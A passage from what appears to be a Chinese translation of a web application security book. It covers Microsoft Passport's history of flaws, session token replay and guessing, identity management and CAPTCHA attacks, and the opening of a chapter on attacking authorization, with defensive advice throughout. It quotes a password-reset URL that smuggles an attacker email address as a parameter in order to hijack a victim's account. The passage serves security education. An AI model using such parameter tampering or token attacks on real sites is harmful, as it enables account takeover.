自从 1999 年引入了 Passport 之后，就出现几种针对它的攻击。在 2000 年，David P. Kormann 和 Aviel D. Rubin 发布了一篇名为 “Risks of the Passport Single Signon Protocol” 的论文，该论文描述了一系列攻击，这些攻击和基本的 Web 特性密切相关，比如 SSL，Netscape 浏览器漏洞，Cookie，JavaScript，以及 DNS 欺骗。他们还指出任何人都可以欺骗一个 .Passport 登录界面，获得会员证书（也被称为 “伪伙伴” 攻击），并推断合作站点的密钥在因特网上的传输是一种有漏洞的方式。整篇文章反复地强调已知因特网认证服务的问题，其演示还没有真正涉及到 Passport 平台的特定问题。

在 2001 年 8 月，Chris Shiflett 发表了一篇论文，讨论 IE 浏览器 5.5 版本之前的漏洞，该漏洞允许恶意站点或电子邮件消息读取客户机器上的 Cookie。他还提到，如果一个

Passport 会员选择在本地保存他或者她的 Passport Cookie，那么攻击者可以利用这一漏洞来窃取 Passport Cookie，并冒充该会员。后来这个 IE 漏洞被修补了，Chris 建议用户使用 Passport 时不要选择“自动登录”选项（因为这会在用户的机器上设置一个永久的 Cookie）。

在 2001 年后，安全研究员 Marc Slemko 发布了一篇分析文章，叫做 “Microsoft Passport to Trouble”，在这篇文章中他叙述了他想出的一个攻击方法，该方法可以使他在采用 Passport 认证的 Hotmail 服务器上使用脚本注入窃取 Passport 认证 Cookie。微软已经修补了这个问题，不过该攻击倒是一个关于窃取认证 Cookie 的绝好例子。

在 2002 年，美国联邦贸易委员会（FTC）宣布对 Passport 安全性的调查结果，并就之前 Passport 的安全能力的市场宣传问题与微软达成和解，要求微软不能“以任何虚假的形式宣传…”关于“在线服务的实际内容”，以及要求微软必须“建立和维持一个综合信息安全程序，其设计能完全保证从用户处收集来的私人信息的安全性、机密性和完整性。”该协议提出了 20 年内一年审计两次的要求，每次违规的潜在罚金高达每天$11000 美元。

在 2003 年 5 月，Muhammad Faisal Rauf Danka 在 Full Disclosure 邮件列表上发布信息，描述了一个允许恶意用户为别的 Passport 用户重置密码的 Passport 漏洞。虽然攻击者事前必须知道他想重置的账户名（比如，someone@hotmail.com），不过这也是严重的攻击，基本上使得所有的 Passport 账户都受到劫持的威胁。微软宣布在 24 小时内修复了这个问题，并且报告没有任何账户受到攻击。FTC 显然认为该问题不属于违反了 2002 年协议，因为没有宣布罚款。在本章后面讲到身份管理攻击时，我们会讨论该攻击的细节。

所有这些分析的共同主题就是说明了使用 Passport 认证的最大危险是重放攻击，该攻击使用从受信任用户电脑上窃取的 Passport 认证 Cookie。当然，如果攻击者可以窃取到认证票据，那么就会像我们在本章前面关于安全令牌重放攻击中的讨论一样，大多数认证系统都形同虚设了。

与其他任何认证系统一样，Passport 认证对密码猜测攻击也有潜在的脆弱性（Passport 密码的最短长度是 6 个字符，不要求有不同的大小写，数字或特殊字符）。虽然没有永久账户锁定特性，但是一个账户试图登录失败了一定次数后，会被暂时禁止登录（依照错误消息的说法，这将持续“一会儿”）。这种设计显著增加了在线密码猜测攻击的时间。攻击者可以在受阻时重置他们的密码，但必须要回答一个合法 Passport 账户所有者在注册时预设的“密码提示问题”。

尽管存在这些问题，如果 Web 站点不在意别人拥有他们客户的认证证书的话，我们觉得 Passport 对这些站点是一种安全的选择。但是，在写这本书的时候，看起来微软不会再支持在非微软站点上使用 Passport 了。

### 4.2 绕过认证

在解决问题的时候，人们时常会有山重水复疑无路，柳暗花明又一村的感觉。在攻击Web认证时，也是一样。就像我们在本章开始时提到的那样，很多应用程序都明白认证在应用程序的安全中的重要性，因此它们实现了非常强健的协议。在这种情况下，直接攻击协议本身可能不是攻击认证的最简单方法。

攻击应用程序的其他组件，比如劫持或欺骗一个已经存在的认证会话，或者攻击身份管理子系统本身，都可以用来绕过认证。在本节中，我们会讨论一些能完全绕过认证的常见攻击。

#### 4.2.1 令牌重放

发放某种安全令牌给已经成功认证的用户，他们在浏览应用程序时就不必再输入证书了，这是一种常用的认证方法。而令人遗憾的是，该机制存在副作用，就是只要简单地重放恶意捕捉下的令牌（这种现象有时称为会话劫持，Session Hijacking），认证就可以被绕过。

一般情况下, Web 应用程序使用两种类型的安全令牌: Cookie 和定制的会话 ID (session identifiers, session ID)。我们将在本节中简要地讨论猜测和获取 Cookie 及会话 ID 的常见方法。关于攻击认证和会话状态的更多信息，请参考第 5 章。

#### 会话 ID 攻击

有两种获取会话 ID 的基本技术：预测和暴力。

在过去，我们看到很多 Web 站点由于使用了可被预测的、有时是连续的会话标识符而被攻击。很多数学技术，比如统计预测法，可以用来预测会话标识符。现在大部分应用程序服务器都使用不可预测的会话标识符了，建立在这些框架上的应用程序，是不容易受到这种攻击的。

对会话 ID 进行暴力攻击，就是用所有可能的会话 ID，进行上千次的请求，以期望正确地猜出一个。需要的请求次数取决于会话 ID 的密钥空间大小。因此，该类攻击的成功概率可以根据会话 ID 的长度和密钥空间大小计算出来。

提示 iDefense.com 的 David Endler 写过一篇详细的文章, 指出了会话 ID 实现中的多种弱点, 请在本章末尾的 “参考和进一步阅读” 一节中寻找其链接。

#### 攻击 Cookie

通常 Cookie 都包含有与认证相关的敏感数据，如果 Cookie 包含有密码或会话标识符，窃取 Cookie 将是针对 Web 站点非常成功的攻击。有好几种常见的技术都可以用来窃取 Cookie，其中最常见的是脚本注入与窃听。我们会在第 6 章中讨论脚本注入技术（也被称为跨站脚本）。

对 Cookie 离线的逆向工程也被证明是非常有效的攻击。最好的方法就是收集 Cookie 的一个例样，用不同的输入观察 Cookie 是如何改变的。这个过程可以通过使用不同的账户在不同的时间登录来实现。其原理是查看 Cookie 是如何根据时间、用户名、访问特权来改变的。Bit-flipping 攻击采用暴力的方法，系统地修改比特位，看这个 Cookie 是否仍然有效，以及是否获得了不同的访问权限。我们会在第 5 章中更详细地讨论 Cookie 攻击。

### ☑ 令牌重放攻击的对抗措施

窃听是窃取诸如 Cookie 之类的安全令牌的最简单方法, 应该使用 SSL 或者其他恰当的会话加密技术来防止被窃听。除了线路上的窃听外, 还应该注意经常使用的 Web 客户端所带有的大量安全问题, 这也会把你的安全令牌暴露给恶意客户端软件或跨站脚本。(参见第10章获得关于这些的更多信息)。

通常，最好的办法是使用由应用程序服务器提供的会话标识符。但是，如果要创建自己的令牌，你必须设计一个无法被预测也不会被暴力攻击攻破的令牌。比如，使用一个随机数生成器产生会话标识符。除此之外，为了防范暴力攻击，要用一个足够大的密钥空间来配合会话标识符（现在的技术大约需要128位），这样就不会被暴力攻击攻破。请记住，在使用伪随机数发生器时需要考虑一些细节，比如，使用四个连续的数字用于伪随机发生器来生成32比特的抽样，再把它们串起来生成一个128位的会话标识符，这样做是不安全的。提供四个抽样来防止暴力攻击，实际上使得会话ID预测变得简单。

你也应该实现安全令牌，比如 Cookie 和 session ID，的完整性检查，来对抗传输篡改和离线分析。

一般情况下，即使你实现了强健的机密性和完整性保护机制，也不推荐在安全令牌中保存敏感数据。记住挑战-应答认证技术的本质，它使用被秘密修改后的 nonce，达到了在线路上发送秘密本身的同样效果。

#### 4.2.2 身份管理

一个功能认证系统需要采用一些方法管理身份——比如注册，账户管理（诸如密码重

置）等。这些操作也同样需要安全地执行，因为错误会影响到非常敏感的信息，比如证书。遗憾的是，身份管理是一个复杂的工作，很多 Web 应用程序都没有很好地完成，而使得它们的认证系统由于身份认证的不完善而受到暴露。

在本节中，我们将讨论针对身份管理的常见攻击。

注意 一些 Web 站点寻求通过全部外包给第三方来避免认证管理问题。微软 Passport 是该服务的一个例子——参见我们前面的关于 Passport 的讨论。

#### 用户注册攻击

有时候,访问一个 Web 站点最简单的方法是用注册系统在该站点创建一个合法的账户。通过把注意力放在注册流程上，这本质上绕过了针对认证界面的攻击。当然，过滤恶意的账户注册行为是有难度的,不过 Web 应用程序已经开发了很多机制来减轻这类行为的威胁，包括 CAPTCHA（Completely Automated Public Turing Tests to Tell Computers and Humans Apart，全自动区分计算机和人类的图灵测试）。当 Web 应用程序拥有者想防范程序、机器人、或脚本执行某些特定行为时，通常在应用程序上使用 CAPTCHA。一些 CAPTCHA 的例子包括：

- 免费 E-mail 服务 很多免费 E-mail 服务使用 CAPTCHA 来防范程序创建伪造的账户，这通常用来减少垃圾邮件。

- 防止密码猜测攻击 CAPTCHA 被用在登录页面中以防范工具和程序执行密码猜测攻击。

☐ 防范搜索引擎机器人 CAPTCHA 有时也用来防范搜索引擎机器人检索页面。

- 在线投票 CAPTCHA 能确保无法用程序自动投票，是一个防止人们篡改在线投票结果的有效方法。

CAPTCHA 是 HIP（Human Interactive Proof）中的一种，HIP 用来确定实体的另端是人类还是机器，以前也被称为逆向图灵测试（Reverse Turing Test，RTT）。CAPTCHA 与之不同的地方是，它是完全自动化的，因而适合在 Web 应用程序中使用。

常见的 CAPTCHA 通常基于文本识别或图像识别，下面的图片展示了常见的 CAPTCHA 实现。

下面显示了 gimpy-r CAPTCHA，它不是很有效，因为自动化流程可以寻找到它的规律性。

Address http://www.captcha.net/cgi-bin/gimpy-r Go Links

In the space below, type the string of letters appearing in the picture.

接下来显示的是用在 Hotmail.com 注册中需要识别的 CAPTCHA，请注意在右上方有音频 CAPTCHA 选项按钮：

Type the characters you see in the picture

The picture contains 8 characters.

下面是来自 CAPTCHA.net 的图片 CAPTCHA:

Choose a word that relates to all the images.

Butterfly

TIP: You can type the first letter of a word and then use the down arrow to find it.

Submit

在计算机视觉和图像识别中的新研究和新进展，已经提供了突破 CAPTCHA 的理论基础。简单的 CAPTCHA，比如 EZ-Gimpy 使用文本识别的方式已经被 California Berkeley 大学的研究员 Greg Mori 和 Jitendra Malik 攻破了。而 Areté Associates 的 Gabriel Moy，Nathan Jones，Curt arkless 和 Randy Potter 创建的程序，可以攻破更加复杂的 Gimpy-r 算法，当时的识别率达到了 78%。

在写这本书时，PWNtcha 是最成功的 CAPTCHA 解码器。它在破解流行网站，诸如

PayPal 和 Slashdot 使用的 CAPTCHA 时，有超过 80% 的成功率。虽然没有公布代码，但你可以上载一个 CAPTCHA 到 Web 站点上解码。图 4-8 显示了一个使用 PWNtcha 的例子。虽然很难得到它的二进制代码，但你可以上载图片到他们的 Web 站点。

 </div>

虽然大多数研究者都没有发布攻破 CAPTCHA 的程序，但这一方面黑客并没有落后研究者太多。笔者曾经和一些公司合作过，他们曾经是自动注册账户机器人的受害者。他们的对策是使用 CAPTCHA。但是，在一个周内，黑客就突破了 CAPTCHA，所以我们推测很可能他们早就拥有了相关的破解程序。由于计算机视觉和处理器能力的进步，只有开发出更复杂的 CAPTCHA 才能达到保护程序效果。

#### 证书管理攻击

另一种绕过认证的方法是攻击证书管理子系统。比如，大多数 Web 站点都实现了常见的密码恢复机制，比如自助应用程序把新的密码发送到一个固定的 E-mail 地址，或者回答“密码提示问题”（举个例子，“你最喜欢的宠物的名字是什么？”或者“你高中就读的是那个学校？”）。

在我们的咨询中发现，很多所谓的“密码提示问题”很容易被猜到，而不是什么“秘密”。举个例子来说，我们曾经遇到过一个密码提示问题，原本的意思是得到客户的 ID 和

邮编，从而恢复密码，而客户 ID 是连续的，邮编则很容易使用常用邮编字典或暴力方法猜出来。

另一个针对密码重设机制的经典的攻击是，使自助密码重设程序发送密码重置信息到不恰当的 E-mail 地址。2003 年 5 月微软的 Passport 因特网认证服务事件表明（我们在本章中 Passport 一节作过简要的讨论），即使是大公司也会这个阴沟里翻船。Passport 的自助密码重设应用程序包括一个多步流程，发送给用户一个 URL 来允许他们改变密码。URL 在 E-mail 中像如下这个形式（由于页面的限制，做了手工的换行）。

https://register.passport.net/emailpwdreset.srf?em=victim@hotmail.com&prefem=attacker@attacker.com&rst=1

虽然这里的查询字符串变量有一点模糊，但在这个例子中的“emailpwdreset”程序会为 victim@hotmail.com 账户发送一个密码重置 URL 到 attacker@attacker.com 这个 E-mail 地址中。接下来，攻击者可以重置“victim”的密码，从而攻破账户。

#### 4.2.3 利用客户端

我们在本章中花费了大部分精力来描述攻击者所使用的窃取或猜测用户证书的方法。那么如果攻击者利用合法的认证会话，轻而易举地让用户来完成所有的工作，那又会怎么样呢？这可能是迄今我们描述过的绕过所有认证机制的最简单方法，而且它不费吹灰之力。在本章的前部分，我们引用了 Bruce Schneier 论文阐述这个观点：中间人攻击和安装在终端用户机器上的恶意软件，可以有效地绕过几乎任何形式的远程网络认证（你可以在本章“参考和进一步阅读”一节中找到该论文的链接）。我们会在第 11 章中详细描述这些方法，但是我们认为在本章结束前说明这点是很重要的。

### 4.2.4. 最后一些思考：身份窃取

在我们写这几页的时候，通过因特网欺骗策略，诸如钓鱼来进行身份盗窃的事情，正被媒体大为宣扬。和很多关于安全的问题一样，这种高调的宣传使公众期望技术可以在某个时候魔术般的扭转情况。现实中新的认证技术被称为是对付身份盗窃问题的银弹。

或许某天有人真的发明了绝对安全和易用的认证协议，但是在这段过渡时期，我们想谴责我们认为在身份窃取中更容易解决的因素：在 Web 认证和身份管理中，广泛地使用个人认证信息（personally identifiable information，PII）。我们大都有这样的经历，使用我们私人生活中的因素来向在线机构验证我们：比如政府标识（比如社会保险号码，SSN）、家庭地址、秘密问题（“你的高中是那所学校？”等），以及生日等等。

Internet 搜索引擎,比如 Google,和 2005 CardSystems 的安全漏洞事件非常明显地表明,

很多这些个人相关因素不再是真正安全的。另外，就像我们在本章中提到的 FTC 控告微软的 Passport 事件一样，如果存储这些敏感信息，在出现安全漏洞事件时，其带来的债务可能会击垮一个公司。

因此，我们向所有的商家（不管他们会听取或不听取我们的建议）发出一个简单的要求：不要收集我们的个人信息（PII），更不要想着用这些信息来认证我们!!!

### 4.3 小结

认证对于任何带有敏感或机密信息的 Web 站点的安全都十分重要。表 4-2 总结了在本章中已经讨论过的认证方法。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>认证方法</td><td style='text-align: center; word-wrap: break-word;'>安全级别</td><td style='text-align: center; word-wrap: break-word;'>服务器端要求</td><td style='text-align: center; word-wrap: break-word;'>客户端要求</td><td style='text-align: center; word-wrap: break-word;'>注释</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>基础认证</td><td style='text-align: center; word-wrap: break-word;'>低</td><td style='text-align: center; word-wrap: break-word;'>服务器上的合法账户</td><td style='text-align: center; word-wrap: break-word;'>·大部分流行浏览器都支持</td><td style='text-align: center; word-wrap: break-word;'>以明文方式传输密码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>摘要</td><td style='text-align: center; word-wrap: break-word;'>中</td><td style='text-align: center; word-wrap: break-word;'>带有明文密码的合法账户</td><td style='text-align: center; word-wrap: break-word;'>大部分流行浏览器都支持</td><td style='text-align: center; word-wrap: break-word;'>在穿过代理服务器和防火墙时有用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PassMark/SiteKey</td><td style='text-align: center; word-wrap: break-word;'>高</td><td style='text-align: center; word-wrap: break-word;'>集成的定制软件</td><td style='text-align: center; word-wrap: break-word;'>浏览器，设备需要注册来进行双重认证</td><td style='text-align: center; word-wrap: break-word;'>2005年才出现，提供服务器认证减轻钓鱼危害</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>一次性密码</td><td style='text-align: center; word-wrap: break-word;'>高</td><td style='text-align: center; word-wrap: break-word;'>集成的定制软件</td><td style='text-align: center; word-wrap: break-word;'>需要外部设备</td><td style='text-align: center; word-wrap: break-word;'>需要客户端设备，这带来了发布的花费</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>集成Windows</td><td style='text-align: center; word-wrap: break-word;'>高</td><td style='text-align: center; word-wrap: break-word;'>合法的Windows账户</td><td style='text-align: center; word-wrap: break-word;'>大部分流行浏览器都支持（可能需要插件）</td><td style='text-align: center; word-wrap: break-word;'>由于浏览器的支持，变得更加的流行了</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>证书</td><td style='text-align: center; word-wrap: break-word;'>高</td><td style='text-align: center; word-wrap: break-word;'>认证的同一个授权中心进行</td><td style='text-align: center; word-wrap: break-word;'>SSL支持，客户端安装证书</td><td style='text-align: center; word-wrap: break-word;'>证书的大规模发布是一个问题</td></tr></table>

Web 站点有不同的需求，对于认证没有哪种方法是最好的。但是，使用下面这些安全设计基本原则，可以阻止本章中所描述的很多攻击：

一个强健的密码策略和账户锁定策略可以使大多数基于密码猜测的攻击失效。

- 不要在证书中使用可识别的个人信息。它们不是真正保密的，如果保存他们，会使你的公司陷入债务中。

☐ 应该使用 HTTPS 来保护认证传输，避免受到窃听和重放攻击的风险。

- 输入验证在防范 Web 站点攻击中起到很大的作用，如果执行了输入验证，可以防止

SQL 注入、脚本注入和命令执行。

- 确保认证安全令牌，比如会话标识符，不会被轻易地预测到，而且也要用一个足够大的密钥空间生成它们，保证不会被轻易地猜出。

- 不要忘记了加固身份管理系统，比如账户注册和证书重设，因为这些系统中的弱点可以完全绕过认证控制。

### 4.4 参考和进一步阅读

#### 免费工具

CAPTCHA 项目（涉及 Gimpy，Bongo，http://www.captcha.net/Pix 和 Sounds）

Chris Shiflett 的 “攻击 Passport”

Mark Slemko 的 “Passport to Trouble”

FTC 控告 Microsoft 的 Passport

Passport 的 E-mail 密码重置漏洞

自由联盟计划

http://www.k2labs.org/chris/articles/passport/

http://alive.znep.com/~marcs/passport/

http://www.ftc.gov/os/2002/08/microsoftagree.pdf

http://www.securityfocus.com/archive/1/320806

http://www.projectliberty.org

强认证技术

PassMark Security 公司

美洲银行的 PassMark 举措，称为 http://www.bankofamerica.com/privacy/passmark

SiteKey

PassMark/SiteKey 的弱点讨论

http://mailchannels.blogspot.com/2005/

07/passmark-sitekey-system-vulnerable-to.html

一次性密码规范

http://www.rsasecurity.com/rsalabs/

node.asp?id=2816

RSA 的 SecureID 的 OTP 举措

http://www.rsasecurity.com

RSA Security 出版社公布 E*Trade http://www.rsasecurity.com/press_

Secure ID 的 RSA Security 举措

release.asp?doc_id=5567

Bruce Schneier 的文章：“双重认证：http://www.schneier.com/essay-083.html

太少、太迟了”，批评 OTP 和其他

双重认证系统

通用的参考

World Wide Web 安全 FAQ 第 5 节：“在 http://www.w3.org/Security/Faq/ wwwsf5.html

你的站点上保护机密文档”

RFC 2617, “HTTP 认证：基础认证和 ftp://ftp.isi.edu/in-notes/rfc2617.txt

摘要访问认证”

RFC 2478, SPNEGO

IIS 认证

http://msdn.microsoft.com/library/

default.asp?url=/library/en-us/vsent7/

html/vxconIISAuthentication.asp

“为 IIS 5.0 建立数字认证”（Q222028） http://support.microsoft.com/

default.aspx?scid=kb;EN-US;q222028    
    
Ronald Tschalär 的文章: “HTTP 的 http://www.innovation.ch/java/ntlm.html    
    
NTLM 认证机制”    
    
“如何在 Windows NT 上禁用 LM 认证” http://support.microsoft.com/?kbid=147706    
    
(Q147706)    
    
“在 ASP.NET 中使用表单认证” http://www.15seconds.com/issue/020220.htm    
    
David Endler 的文章: “Session ID 暴 http://www.idefense.com/idpapers/SessionIDs.pdf    
    
力攻击”

## 第 5 章 攻击 Web 授权

我们在第 4 章中看到，如何通过认证（authentication）来确定一个用户是否可以登录到一个 Web 应用程序。而通过授权（authorization）则可以确定经过认证的用户可以访问应用程序的哪些部分，以及他们在应用程序中可执行哪些操作。因为 HTTP 协议是无状态的，甚至缺乏区分每个认证用户的会话这个最基本的概念，所以，Web 授权的实现对程序员而言充满了挑战，也因此成为攻击有利可图的目标。

注意 我们将认证（authentication）缩写为 authn，将授权（authorization）缩写为 authz。

授权的典型实现是给已经通过认证的用户会话（session）提供访问令牌（access token）作为访问应用程序的用户的唯一标识。应用程序将令牌中的标识符和对象上的访问控制列表（access control list，ACL）相比较，然后决定是否允许对内部对象的访问。如果提供的标识符和对象所配置的权限匹配，就允许访问；如果不匹配，就拒绝访问。在接下来的请求中，每次都用这个令牌，因而应用程序不需要重复认证用户就可以进行解析。当注销或会话超时，令牌就会被删除或者失效。

注意 标识符通常用来区分不同的会话，常被称为会话 ID，它和访问令牌的作用是相同的。

注意 HTTP 基础认证使用老套的方法，它对同一个域中的每个请求，都在 HTTP Authorize 头中重放最初 Base 64 编码后的用户名：密码。

显然，访问令牌给用户提供了极大的方便，但是，这样的便利通常是有代价的。恶意攻击者通过猜测、重放或者冒充某人的令牌，可以查看到某些数据或者执行某些操作，而在正常情况下，这些数据和操作是不允许其他用户查看和操作的（称为水平特权提升，horizontal privilege escalation），甚至连管理员也没有权限（称为垂直特权提升，vertical

privilege escalation）。另一方面，在服务器端，ACL可能会因为配置错误而批准了未授权的用户，或者在某些情况下，程序中存在可以绕过的ACL漏洞。

这里要突出强调的一点是，攻击授权有两个目的：劫持应用程序所使用的授权/会话令牌；绕过服务器端的 ACL。本章主要围绕授权的这两个方面，分成如下小节：

○ 授权实现的指纹识别

O 攻击 ACL

○ 攻击令牌

○ 授权攻击案例分析

○ 授权最佳实践

在许多方面，授权是一个系统安全控制的核心和灵魂。在本章结束后，你可能会同意这一点：没有哪个 Web 应用可以在技术高超的敌人面前幸免。

### 5.1 授权实现的指纹识别

Web 应用的授权可以很复杂而且可以定制。因此，有经验的攻击者会首先寻找授权的实现 “指纹”，以便在发起攻击前充分了解情况。

#### 5.1.1 爬行 ACL

检查一个站点所遍布的 ACL 的最简单方法它爬行此站点。我们在第 2 章里讨论过 Web 爬行技术，其中介绍了几种可以自动化 Web 爬行过程的工具（有时称为离线浏览器，因为它们把文件保存在本地，以便将来进行分析）。我们将在这里介绍另外一种 Web 爬行工具：Offline Explorer Pro（来自 Meta Products Software Corp.），与第 2 章中讨论的那些工具相比，它对 Web ACL 有更好的可见性。

和大部分 Web 爬行工具类似，Offline Explorer Pro（OEP）相当的简单——只需给它一个 URL，它就会从提供的 URL 开始，抓取指定深度范围内的所有可链接资源。OEP 的一个有趣功能是，它会显示每个请求所收到响应的 HTTP 状态代码，这样很容易看到文件和文件夹的 ACL。比如，在图 5-1 中，OEP 的下载进程面板显示了一个 401 错误：未授权响应，说明该资源是受 ACL 保护的，需要经认证后才能访问。

OEP 也支持绝大部分流行的 Web 认证协议（包括 Windows NTLM 和 HTML 形式），这使得它很容易在站点上执行差异分析（differential analysis）。差异分析就是用未认证的和认证后的会话来爬行站点，或者作为不同的已认证用户来爬行站点，从而搞清楚什么资源是受保护的，禁止哪些用户访问它们。OEP 中的认证配置选项有点难找，它位于指定项目

的项目属性页面上（“文件”|“属性”），在高级分类下面，标签为“Passwords”，如图 5-2 所示。

 </div>

 </div>

该方法的唯一缺点是只能看见从其他页面链接过去的 Web 站点内容。因此，仅使用 Web 爬行工具，你可能无法获得完整的视图（比如，隐藏的 admin 页面不会从任何站点的主要页面上链接过去，因此爬行工具抓不到它）。当然，就像我们在第 2 章中看到的那样，自动化爬行工具也提供了更严格的手工分析的功能，以便更容易发现那些隐藏的内容。除非有人发明一个全自动的爬行工具，能够完美地执行人类的技巧——比如细审 HTML 源代码，获得关于开发者留下的隐藏目录的线索，否则这是目前可行的最好方法。

#### 5.1.2 识别访问/会话令牌

有时候很容易在 Web 应用程序流中看到访问/会话令牌，而有时候却又不那么容易。为了让读者理解接下来的章节中我们查找的内容，表 5-1 列出了在访问/会话令牌中常见的信息，以及常用缩写。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>会话属性</td><td style='text-align: center; word-wrap: break-word;'>常见缩写</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>用户名</td><td style='text-align: center; word-wrap: break-word;'>username, user, uname, customer</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>用户标识符</td><td style='text-align: center; word-wrap: break-word;'>id, *id, userid, uid, *uid, customerid</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>用户角色</td><td style='text-align: center; word-wrap: break-word;'>admin=TRUE/FALSE, role=admin, priv=1</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>用户配置</td><td style='text-align: center; word-wrap: break-word;'>profile, prof</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>购物车</td><td style='text-align: center; word-wrap: break-word;'>cart, cartid</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>会话标识符</td><td style='text-align: center; word-wrap: break-word;'>session ID, sid, sessid</td></tr></table>

##### COTS 会话 ID

许多常见的现成（off-the-shelf，COTS）Web 服务器可以生成它们自己的伪随机会话ID。表 5-2 列出了一些常见服务器及其对应的会话追踪变量。这些 ID 由更现代化的服务器生成，虽然它们易受到重放攻击，但通常都有足够大的空间来对抗猜测攻击（我们会在接下来的“攻击令牌”小节中讨论这些内容）。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>应用程序服务器</td><td style='text-align: center; word-wrap: break-word;'>会话 ID 变量名</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IIS</td><td style='text-align: center; word-wrap: break-word;'>ASPSESSIONID</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>基于 J2EE 的服务器</td><td style='text-align: center; word-wrap: break-word;'>JSESSIONID</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>PHP</td><td style='text-align: center; word-wrap: break-word;'>PHPSESSID</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Apache</td><td style='text-align: center; word-wrap: break-word;'>SESSIONID</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>ColdFusion</td><td style='text-align: center; word-wrap: break-word;'>CFID</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>CFTOKEN</td></tr><tr><td style='text-align: center; word-wrap: break-word;'></td><td style='text-align: center; word-wrap: break-word;'>JSESSIONID (运行在 J2EE 之上)</td></tr></table>

续表

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>应用程序服务器</td><td style='text-align: center; word-wrap: break-word;'>会话 ID 变量名</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>其他</td><td style='text-align: center; word-wrap: break-word;'>JservSessionIDJWSESSIONIDSESSIDSESSIONSIDsession_id</td></tr></table>

#### 5.1.3 分析会话令牌

好，假设你现在正在对一个 Web 应用程序的授权/会话管理功能进行指纹探测，并且已经确定了一个可能是会话令牌的值，但是该值是一串难以读懂的 ASCII 字符或者一个混乱的数字值，看不出应该如何使用它。怎么办？投降吗？当然不！本节讨论一些方法，可用来确定你得到的是什么样的令牌。

即使会话数据乍看起来不容易理解，但是加一点额外的分析（需要大量的经验！）就可以摸索出细微的线索，从而使得猜测能够继续。比如，一些会话组件是完全可以预测的，因为它们有标准的格式，或者是可预测的行为方式。举个例子，时间戳，就能够通过令牌中连续增加的值而被识别出来。我们在表 5-3 中列出了一些针对这些确定性项目的常见攻击。

提示 使用 GNU 的 date +%s 命令来查看当前时间，可以尝试如下的 Perl 命令将其转换成一个容易阅读的格式：

perl -e 'use Time::localtime; print ctime(<epoch number>)'

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>会话组件</td><td style='text-align: center; word-wrap: break-word;'>识别特征</td><td style='text-align: center; word-wrap: break-word;'>可能的攻击</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>时间和时间戳</td><td style='text-align: center; word-wrap: break-word;'>即使它们被编码，也会不断改变。通常是一个文本字符串，或者一个10位时间格式的数字。</td><td style='text-align: center; word-wrap: break-word;'>改变这个值可能会延长登录期限，可以利用这一点实施重放攻击。</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>连续增加的数字</td><td style='text-align: center; word-wrap: break-word;'>对每个请求做单调的改变。</td><td style='text-align: center; word-wrap: break-word;'>改变这个值可能会导致会话劫持。</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>用户配置</td><td style='text-align: center; word-wrap: break-word;'>对已知值的编码格式：姓名、地址等</td><td style='text-align: center; word-wrap: break-word;'>会话劫持</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>服务器IP地址</td><td style='text-align: center; word-wrap: break-word;'>4个字节；例如，192.168.0.1可以是0xC0A80001（高比特位在前）或者0x0100A8C0（低比特位在前）。</td><td style='text-align: center; word-wrap: break-word;'>改变这个值可能会中断会话，但有助于映射Web服务器群。</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>客户端IP地址</td><td style='text-align: center; word-wrap: break-word;'>与服务器IP地址相同。</td><td style='text-align: center; word-wrap: break-word;'>可能利用来进行重放攻击，会话劫持</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Salt</td><td style='text-align: center; word-wrap: break-word;'>可能随每个请求、每个会话而改变，也可能保持不变。</td><td style='text-align: center; word-wrap: break-word;'>收集这些值可以帮助攻击者猜测服务器用于加密数据的密钥。</td></tr></table>

##### 分析编码和加密

一串难以读懂的 ASCII 字符通常意味着两件事情：数据已经被编码或者加密。如果是前者，那么还有一线曙光；如果是后者，你最好把精力放在应用程序的功能分析上，那可能是唯一的出路。

击破编码 Base64 是 Web 应用程序中最流行的编码算法。如果你看到一个编码方案使用大小写字母（A～Z，a～z），数字（0～9），“+” 和 “/” 符号，并以 “=” 结束，那么该编码方案很可能是 Base64。

目前，存在很多编码/解码工具。比如，在第 1 章中讨论过的 Fiddler HTTP 分析工具，可以编码/解码 Base64，URL 和十六进制格式。

如果你想为自动化会话分析等功能而编写自己的 Base 64 处理器，Perl 是个不错的选择，用 Perl 对以 Base 64 形式保存的数据编解码很简单。下面是两个 Perl 脚本（实际上只有两行有效的 Perl 代码），可以用来进行 Base 64 的编码和解码：

#!/usr/bin/perl
# be64.pl
# encode to base 64
use MIME::Base64;
print encode_base64($ARGV[0]);
解码器：
#!/usr/bin/perl
# bd64.pl
# decode from base 64
use MIME::Base64;
print decode_base64($ARGV[0]);

分析加密 Web 应用可以采用加密和/或哈希算法来保护授权数据。最常用的算法并不像 Base 64 那样容易被解码。但是，它们仍会受到重放攻击和定置攻击，因此，确定令牌中是哈希值还是加密值，是有助于攻击的。

